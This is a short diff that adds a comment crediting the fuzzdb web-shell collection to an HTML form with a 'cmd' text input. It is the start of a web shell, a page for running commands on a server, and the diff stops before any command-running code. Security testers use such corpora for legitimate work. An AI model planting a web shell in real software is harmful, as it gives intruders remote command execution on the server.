@@ -1,3 +1,4 @@
+<? //from fuzzdb-webshell ?>
 <HTML><BODY>
 <FORM METHOD="GET" NAME="myform" ACTION="">
 <INPUT TYPE="text" NAME="cmd">
